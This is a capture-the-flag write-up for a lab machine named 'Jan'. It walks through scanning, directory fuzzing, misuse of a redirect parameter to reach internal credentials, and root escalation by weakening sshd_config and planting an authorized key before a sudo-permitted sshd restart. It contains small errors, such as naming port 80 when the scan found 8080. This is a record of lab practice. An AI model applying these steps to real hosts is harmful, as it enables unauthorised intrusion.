---
title: Jan
layout: default
---

## Reconnaissance

### Step 1: Enumerate the network interface

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.103  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1000  (Ethernet)
```

**Key points:** 
- Networok Interface: `ens160`

### Step 2: Enumerate IP machine

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.106	08:00:27:f1:88:f2	PCS Systemtechnik GmbH
```

**Key points:** 
- IP Machine: `192.168.0.106`

### Step 3: Enumerate open ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.106
```

**OUTPUT**

```bash
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

**Key points:** 
- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `80/tcp open http`: This indicates that the HTTP (Hypertext Transfer Protocol) service is running on port 80.

Visit `http://192.168.0.106:8080`

![](/assets/images/WriteUp-Jan-8.png)

### Step 4: Fuzzing to HTTP Server


Hacemos fuzzing a `http://192.168.0.106:8080`:

```bash
dirb http://192.168.0.106:8080

URL_BASE: http://192.168.0.106:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.106:8080/ ----
+ http://192.168.0.106:8080/redirect (CODE:400|SIZE:24)                                                                
+ http://192.168.0.106:8080/robots.txt (CODE:200|SIZE:16)                                                                                                                     
-----------------
DOWNLOADED: 4612 - FOUND: 2
```

**Key points:** 
- `Redirect` and `robots.tx` were found

We read `robots.tx`:

![](/assets/images/Pasted_image_20250219223802.png)

**Key points:** 
- The following directories were found: `redirect` and `credz`.

![](/assets/images/WriteUp-Jan.png)

Since it is only accessible internally, we will use `127.0.0.1` later.

![](/assets/images/WriteUp-Jan-1.png)

Here we are told that we need a `url` parameter, so I will proceed to pass the parameter through a concatenation of `redirect` and `credz`:

![](/assets/images/WriteUp-Jan-3.png)

**Key points:** 
- The credentials were revealed to us, which we will use to access by ssh

```bash
❯ ssh ssh@192.168.0.106
ssh@192.168.0.106's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ 
```

**FLAG 1:**

```bash
jan:~$ ls
user.txt
```

Now, we list the existing permissions:

```bash
jan:~$ sudo -l 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

**Key points:** 
- `/sbin/service sshd restart`:  This command does not require root permissions to use it.
`
## Privilege Escalation

We can take advantage of this command, so that by editing `/etc/ssh/sshd/sshd_config` we can modify certain restrictions and escalate privileges:

### Step 1: Edit `/etc/ssh/sshd_config`

For that, we will use `vi` application:

```bash
jan:~$ vi /etc/ssh/sshd_config
```

![](/assets/images/WriteUp-Jan-4.png)

![](/assets/images/WriteUp-Jan-6.png)

**Key points:** 
- `PermitRootLogin`:
	- **Before:**

		```bash
		PermitRootLogin prohibit-password
		```

		This means **the root user can log in via SSH, but only using public key authentication**.  
		Password-based authentication for root is disabled.

	- **After:**

		```bash
		PermitRootLogin yes
		```
		
		Now **the root user can log in via SSH using any authentication method**, including a password.  
		**This is a security risk** because if someone guesses the root password, they will gain access to the server.

- `StrictModes`

	- **Before:**
		
		```bash
		StrictModes yes
		```
		
		SSH checks whether authentication files (such as `~/.ssh/authorized_keys`) have the correct permissions.  
		If the permissions are insecure, **SSH blocks access**.
		
	- **After :**
	
		```bash
		StrictModes no
		```
		
		Now **SSH will not validate the permissions of authentication files**, which may allow insecure configurations.  
		**This is risky**, as an attacker could modify the `.ssh/authorized_keys` file and inject malicious keys.

- `AuthorizedKeysFile`

	- **Before:**
	
		```bash
		AuthorizedKeysFile .ssh/authorized_keys
		```
		
		SSH will look for allowed public keys in `~/.ssh/authorized_keys` inside the user’s home directory.
	
	- **After :**
	
		```bash
		AuthorizedKeysFile /home/ssh/.ssh/authorized_keys
		```
		
		Now **SSH will look for public keys in `/home/ssh/.ssh/authorized_keys`** instead of the user's default `~/.ssh/authorized_keys` file.  
		This can be useful if you want to centralize authentication using a shared key file.

### Step 2: Create RSA Keys

We now proceed to create an RSA key pair:

```bash
jan:~$ ssh-keygen -t rsa
```

>[!Note]
>Press ENTER to any question

Once created them, go `/.ssh`:

```bash
jan:~/.ssh$ ls
```

**OUTPUT**

```bash
id_rsa      id_rsa.pub
```

**Key points:** 
- The RSAs we generate: `id_rsa` and `id_rsa.pub`.

Rename `id_rsa.pub`:

```bash
jan:~/.ssh$ mv id_rsa.pub authorized_keys
```

Restart service:

```bash
jan:~/.ssh$ sudo /sbin/service sshd restart
```

### Step 3: Use `id_rsa`

Copy the content of `id_rsa` and use it to connect as root user, from our host

```bash
ssh -i id_rsa root@192.168.0.106
```

We have escalated privileges and have become 'root' users.

```bash
jan:~# whoami
root
```

**FLAG 2:**

```bash
jan:~# ls
root.txt  ver.sh
jan:~# cat ver.sh 
#!/bin/bash

# Verifica si el proceso "lol" está en ejecución
if ! pgrep -x "httpz" > /dev/null
then
    /opt/httpz &
fi
jan:~# 
```

